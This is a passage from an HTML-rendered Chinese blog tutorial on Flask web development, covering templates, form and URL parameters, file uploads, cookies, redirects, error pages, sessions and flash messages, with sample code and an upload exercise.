class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/hello.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/hello.html</span></span><br><span class="line"><span class="string">/static</span></span><br><span class="line">    <span class="string">/hello.css</span></span><br></pre></td></tr></table></figure><p>hello.py 文件中的代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br></pre></td></tr></table></figure><p>templates/hello.html 存放的是前端代码，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='hello.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello ShiYanLou<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>static/hello.css 存放的是 css 代码，如下所示：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1&amp;<span class="comment">#123;</span></span><br><span class="line"><span class="symbol">    color:</span> green<span class="comment">;</span></span><br><span class="line">    text-align: center<span class="comment">;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="接收请求数据"><a href="#接收请求数据" class="headerlink" title="接收请求数据"></a>接收请求数据</h1><p>首先你需要从 flask 模块中导入request:<br>from flask import request<br>当前请求的方法可以用method属性来访问。你可以用form属性来访问表单数据 (数据在 POST 或者PUT中传输)。<br>这里是上面提及到的两种属性的完整的例子:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'POST'</span>, <span class="string">'GET'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="keyword">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> valid_login(request.form[<span class="string">'username'</span>],</span><br><span class="line">                       request.form[<span class="string">'password'</span>]):</span><br><span class="line">            <span class="keyword">return</span> log_the_user_in(request.form[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">error</span> = <span class="string">'Invalid username/password'</span></span><br><span class="line">     当请求形式为“GET”或者认证失败则执行以下代码</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="keyword">error</span>=<span class="keyword">error</span>)</span><br></pre></td></tr></table></figure></p><p>如果在form属性中不存在上述键值会发生些什么？在这种情况下会触发一个特别的 KeyError。你可以像捕获标准的KeyError一样来捕获它，如果你不这样去做，会显示一个HTTP 400 Bad Request错误页面。所以很多情况下你不需要处理这个问题。</p><p>你可以用args属性来接收在URL ( ?key=value )中提交的参数:<br>searchword = request.args.get(‘key’, ‘’)<br>我们推荐使用get来访问 URL 参数或捕获KeyError，因为用户可能会修改 URL，向他们显示一个400 bad request页面不是用户友好的。</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>你能够很容易地用 Flask 处理文件上传。只要确保在你的 HTML 表单中不要忘记设置属性enctype=”multipart/form-data”，否则浏览器将不会传送文件。</p><p>上传的文件是存储在内存或者文件系统上一个临时位置。你可以通过请求对象中files属性访问这些文件。每个上传的文件都会存储在这个属性字典里。它表现得像一个标准的 Python file对象，但是它同样具有save()方法，该方法允许你存储文件在服务器的文件系统上。</p><p>下面是一个简单的例子用来演示提交文件到服务器上:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/uploaded_file.txt'</span>)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>如果你想要知道在上传到你的应用之前在客户端的文件名称，你可以访问filename属性。<br>但请记住永远不要信任这个值，因为这个值可以伪造。如果你想要使用客户端的文件名来在服务器上存储文件，把它传递到Werkzeug提供给你的secure_filename()函数:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def upload_file():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/'</span> + secure_filename(f.filename))</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h1 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h1><p>你可以用 cookies 属性来访问 Cookies 。你能够用响应对象的 set_cookie 来设置 cookies。请求对象中的 cookies 属性是一个客户端发送所有的 cookies 的字典。</p><p>如果你要使用会话(sessions)，请不要直接使用 cookies，相反，请用 Flask 中的会话，Flask 已经在cookies 上增加了一些安全细节；关于更多 seesions 和 cookies 的区别与联系，请参见施杨出品的博客。</p><p>读取 cookies:<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    username = request.cookies.<span class="built_in">get</span>(<span class="string">'username'</span>)</span><br><span class="line">     注意这里引用cookies字典的键值对是使用cookies.<span class="built_in">get</span>(<span class="built_in">key</span>)</span><br><span class="line">     而不是cookies[<span class="built_in">key</span>]，这是防止该字典不存在时报错<span class="string">"keyerror"</span></span><br></pre></td></tr></table></figure></p><p>存储 cookies:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(render_template(...))</span><br><span class="line">    resp.set_cookie(<span class="string">'username'</span>, <span class="string">'the username'</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><p>注意cookies是在响应对象中被设置。由于通常只是从视图函数返回字符串，Flask 会将其转换为响应对象。如果你要显式地这么做，可以使用 make_response() 函数接着修改它。</p><p>有时候你可能要在响应对象不存在的地方设置cookie。利用延迟请求回调模式使得这种情况成为可能。</p><p>本节讲解了 flask 的请求，如果想在没有请求的情况下获取上下文，可以使用test_request_context()或者request_context()，从request对象的form中可以获取表单的数据，args中可以获取 URL 中的参数，files可以获取上传的文件，cookies可以操作cookie。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>请实现一个上传图片到服务器的功能。具体要求如下：</p><p>在 /home/shiyanlou/Code 目录下新建 upload_file.py 文件并在其中写入本练习的代码。<br>要求上传的文件保存位置为 /home/shiyanlou/Code 目录下。<br>当访问首页 <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> 时出现表单可以上传文件，<br>当上传成功后在浏览器可以看到 &lt;上传的文件名&gt; upload successed!</p><p>参考代码<br>在 /home/shiyanlou/Code/upload_file.py 文件中添加如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename    获取上传文件的文件名</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/home/shiyanlou/Code'</span>    上传路径</span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>])    允许上传的文件类型</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span>    验证上传的文件名是否符合要求，文件名必须带点并且符合允许上传的文件类型要求，两者都满足则返回 true</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:    如果是 POST 请求方式</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]    获取上传的文件</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):    如果文件存在并且符合要求则为 true</span><br><span class="line">            filename = secure_filename(file.filename)    获取上传文件的文件名</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))    保存文件</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&amp;#123;&amp;#125; upload successed!'</span>.format(filename)    返回保存成功的信息</span><br><span class="line">     使用 GET 方式请求页面时或是上传文件失败时返回上传文件的表单页面</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload new File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload new File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="" method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure></p><h1 id="重定向、响应、会话和扩展"><a href="#重定向、响应、会话和扩展" class="headerlink" title="重定向、响应、会话和扩展"></a>重定向、响应、会话和扩展</h1><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><p>你能够用redirect()函数重定向用户到其它地方。能够用abort()函数提前中断一个请求并带有一个错误代码。</p><p>下面是一个演示它们如何工作的例子，在 /home/shiyanlou/Code/ 目录下新建 hello.py 文件并向其中写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    abort(<span class="number">401</span>)</span><br><span class="line">    this_is_never_executed()</span><br></pre></td></tr></table></figure></p><p>按照之前的方式运行应用，这是一个相当无意义的例子因为用户会从主页/重定向到一个不能访问的页面/login（ 401 意味着禁止访问），但是它说明了重定向如何工作。</p><p>默认情况下，每个错误代码会显示一个黑白错误页面。比如上面的页面会显示 401 Unauthorized。<br>如果你想定制错误页面，可以使用errorhandler()装饰器，向 /home/shiyanlou/Code/hello.py 文件中添加如下代码:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(401)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'page_not_found.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p><p>注意到 404 是在render_template()调用之后。告诉 Flask 该页的错误代码应是 404 ，即没有找到。默认的 200 被假定为：一切正常。</p><p>在 /home/shiyanlou/Code 目录下新建 templates 文件夹，并在其中新建 page_not_found.html 文件。<br>向 page_not_found.html 文件中添加如下代码：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="built_in">page</span> <span class="built_in">not</span> found, this <span class="keyword">is</span> an error <span class="built_in">page</span>.&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>一个视图函数的返回值会被自动转换为一个响应对象。如果返回值是一个字符串，它被转换成一个响应主体是该字符串，错误代码为 200 OK ，媒体类型为text/html的响应对象。Flask 把返回值转换成响应对象的逻辑如下：</p><p>如果返回的是一个合法的响应对象，它会直接从视图返回。<br>如果返回的是一个字符串，响应对象会用字符串数据和默认参数创建。<br>如果返回的是一个元组而且元组中元素能够提供额外的信息。这样的元组必须是(response, status, headers) 形式且至少含有其中的一个元素。status值将会覆盖状态代码，headers可以是一个列表或额外的消息头值字典。<br>如果上述条件均不满足，Flask 会假设返回值是一个合法的 WSGI 应用程序，并转换为一个请求对象。<br>如果你想要获取在视图中得到的响应对象，你可以用函数make_response()。</p><p>想象你有这样一个视图:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'error.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p><p>你只需要用make_response()封装返回表达式，获取结果对象并修改，然后返回它：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">'error.html'</span>), <span class="number">404</span>)</span><br><span class="line">    resp.headers[<span class="string">'X-Something'</span>] = <span class="string">'A value'</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>除了请求对象，还有第二个称为session对象允许你在不同请求间存储特定用户的信息。这是在 cookies 的基础上实现的，并且在 cookies 中使用加密的签名。这意味着用户可以查看 cookie 的内容，但是不能修改它，除非知道签名的密钥。</p><p>要使用会话，你需要设置一个密钥。这里介绍会话如何工作，在 /home/shiyanlou/Code 目录下新建 test.py 文件并写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"> 设置密钥，保证会话安全</span><br><span class="line">app.secret_key = <span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Logged in as %s'</span> % escape(session[<span class="string">'username'</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You are not logged in'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">     如果用户名存在，则从会话中移除该用户名</span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p><p>这里提到的escape()可以在你不使用模板引擎的时候做转义（如同本例）。其中，login函数中返回的网页源代码可以单独存储在templates文件夹中作为模板文件html，然后使用return render_template()更方便。</p><p>按照前面的方式运行程序：</p><p>当访问首页 <a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> 时会显示 You are not logged in；</p><p>当访问登录页面 <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> 时会出现一个输入框，在输入框中输入用户名 shiyanlou，然后点击 Login 按钮，这时 URL 会重定向到首页上，首页显示 Logged in as shiyanlou；</p><p>最后再访问登出页面 <a href="http://127.0.0.1:5000/logout，这时从" target="_blank" rel="noopener">http://127.0.0.1:5000/logout，这时从</a> session 中移除了用户名，URL 重定向到首页显示 You are not logged in；</p><p>怎样产生一个好的密钥：</p><p>随机的问题在于很难判断什么是真随机。一个密钥应该足够随机。你的操作系统可以基于一个密码随机生成器来生成漂亮的随机值，这个值可以用来做密钥:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c 'import os; print(os.urandom(16))'</span><br><span class="line">b'm <span class="symbol">\x</span>f8&gt;]?<span class="symbol">\x</span>86<span class="symbol">\x</span>cf/y<span class="symbol">\x</span>0e<span class="symbol">\x</span>c5<span class="symbol">\x</span>c7j<span class="symbol">\x</span>c5/'</span><br></pre></td></tr></table></figure></p><p>把这个值复制粘贴到你的代码，你就搞定了密钥。</p><p>使用基于 cookie 的会话需注意: Flask 会将你放进会话（session）对象的值序列化到 cookie 。如果你试图寻找一个跨请求不能存留的值，cookies 确实是启用的，并且你不会获得明确的错误信息，检查你页面请求中 cookie 的大小，并与 web 浏览器所支持的大小对比。</p><h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>好的应用和用户界面全部是关于反馈。如果用户得不到足够的反馈，他们可能会变得讨厌这个应用。Flask 提供了一个真正的简单的方式来通过消息闪现系统给用户反馈。消息闪现系统基本上使得在请求结束时记录信息并在下一个 （且仅在下一个）请求中访问。通常结合模板布局来显示消息。</p><p>使用flash()方法来闪现一个消息，使用get_flashed_messages()能够获取消息，get_flashed_messages()也能用于模板中。</p><p>下面来看一个简单的例子，在 /home/shiyanlou/Code 目录下新建 flashTest.py 文件，并向其中写入如下代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, flash, redirect, render_template, \</span><br><span class="line">     request, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name_<span class="number">_</span>)</span><br><span class="line">app.secret_key = b<span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    error = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> \</span><br><span class="line">                request.form[<span class="string">'password'</span>] != <span class="string">'secret'</span><span class="symbol">:</span></span><br><span class="line">            error = <span class="string">'Invalid credentials'</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error=error)</span><br></pre></td></tr></table></figure></p><p>然后在 /home/shiyanlou/Code/templates 目录下新建 base.html 页面，其中写入基本的模板代码，代码主要是从后端获取 flash 消息以及错误信息。</p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;title&gt;My Application&lt;/title&gt;</span><br><span class="line">&amp;<span class="string">#123</span>;% <span class="keyword">with</span> messages = get_flashed_messages() %&amp;<span class="string">#125</span>;</span><br><span class="line">  &amp;<span class="string">#123</span>;% <span class="keyword">if</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;ul class=flashes&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% <span class="keyword">for</span> message <span class="keyword">in</span> messages %&amp;<span class="string">#125</span>;</span><br><span class="line">      &lt;li&gt;&amp;<span class="string">#123</span>;&amp;<span class="string">#123</span>; message &amp;<span class="string">#125</span>;&amp;<span class="string">#125</span>;&lt;/li&gt;</span><br><span class="line">    &amp;<span class="string">#123</span>;% endfor %&amp;<span class="string">#125</span>;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &amp;<span class="string">#123</span>;% endif %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% endwith %&amp;<span class="string">#125</span>;</span><br><span class="line">&amp;<span class="string">#123</span>;% block body %&amp;<span class="string">#125</span>;&amp;<span class="string">#123</span>;% endblock %&amp;<span class="string">#125</span>;</span><br></pre></td></tr></table></figure><p>在该目录下新建 index.html 页面，这个页面继承于 base.html 页面：<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends <span class="string">"base.html"</span> %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  &lt;h1&gt;Overview&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;<span class="keyword">Do</span> you want <span class="keyword">to</span> &lt;a href=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span>&gt;<span class="keyword">log</span> <span class="keyword">in</span>?&lt;/a&gt;</span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>在该目录下新建 login.html 页面，这个页面也继承于 base.html 页面：.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 